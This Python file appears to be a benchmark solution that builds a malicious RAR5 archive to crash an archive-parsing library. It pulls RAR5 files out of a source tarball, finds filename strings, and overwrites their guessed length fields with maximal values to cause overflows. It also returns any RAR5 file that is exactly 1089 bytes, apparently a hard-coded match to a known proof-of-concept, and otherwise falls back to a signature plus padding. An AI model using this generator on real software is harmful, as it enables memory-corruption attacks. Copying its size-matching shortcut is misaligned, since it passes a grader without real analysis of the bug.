import tarfile

RAR5_SIGNATURE = b'Rar!\x1A\x07\x01\x00'


def find_ascii_runs(data):
    names = []
    i = 0
    n = len(data)
    while i < n:
        b = data[i]
        if 32 <= b <= 126:
            j = i + 1
            while j < n and 32 <= data[j] <= 126:
                j += 1
            seg = data[i:j]
            length = j - i
            if 3 <= length <= 64 and (b'.' in seg or b'/' in seg or b'\\' in seg):
                names.append((i, j))
            i = j
        else:
            i += 1
    return names


def decode_leb128_exact(bs):
    if not bs:
        return None
    result = 0
    shift = 0
    last_index = len(bs) - 1
    for idx, b in enumerate(bs):
        result |= (b & 0x7F) << shift
        if b & 0x80 == 0:
            if idx != last_index:
                return None
            return result
        shift += 7
    return None


def detect_length_fields(data, pos, strlen, max_back=8):
    candidates = []
    for width in range(1, max_back + 1):
        start = pos - width
        if start < 0:
            break
        bs = data[start:pos]
        v = decode_leb128_exact(bs)
        if v is not None and v == strlen:
            candidates.append((start, width, 'leb128'))
        if width in (1, 2, 4, 8):
            v_le = int.from_bytes(bs, 'little')
            if v_le == strlen:
                candidates.append((start, width, 'plain_le'))
            v_be = int.from_bytes(bs, 'big')
            if v_be == strlen:
                candidates.append((start, width, 'plain_be'))
    return candidates


def make_huge_value_bytes(width, encoding):
    if encoding == 'leb128':
        maxv = (1 << (7 * width)) - 1
        val = maxv
        out = []
        for i in range(width):
            b = val & 0x7F
            val >>= 7
            if i < width - 1:
                b |= 0x80
            out.append(b)
        if val != 0:
            return None
        return bytes(out)
    elif encoding in ('plain_le', 'plain_be'):
        maxv = (1 << (8 * width)) - 1
        val = maxv
        byteorder = 'little' if encoding == 'plain_le' else 'big'
        return val.to_bytes(width, byteorder)
    return None


def patch_rar(data):
    ba = bytearray(data)
    names = find_ascii_runs(data)
    changed = False
    for start, end in names[:20]:
        strlen = end - start
        candidates = detect_length_fields(data, start, strlen)
        for off, width, enc in candidates:
            new_bytes = make_huge_value_bytes(width, enc)
            if new_bytes is None:
                continue
            if ba[off:off + width] == new_bytes:
                continue
            ba[off:off + width] = new_bytes
            changed = True
    return bytes(ba) if changed else None


class Solution:
    def solve(self, src_path: str) -> bytes:
        candidate_rars = []
        with tarfile.open(src_path, 'r:*') as tar:
            for m in tar.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 2000000:
                    continue
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                if len(data) >= 8 and data.startswith(RAR5_SIGNATURE):
                    if len(data) == 1089:
                        return data
                    candidate_rars.append((m.name, data))
        for name, data in candidate_rars:
            patched = patch_rar(data)
            if patched is not None:
                return patched
        if candidate_rars:
            return candidate_rars[0][1]
        return RAR5_SIGNATURE + b'A' * 1000
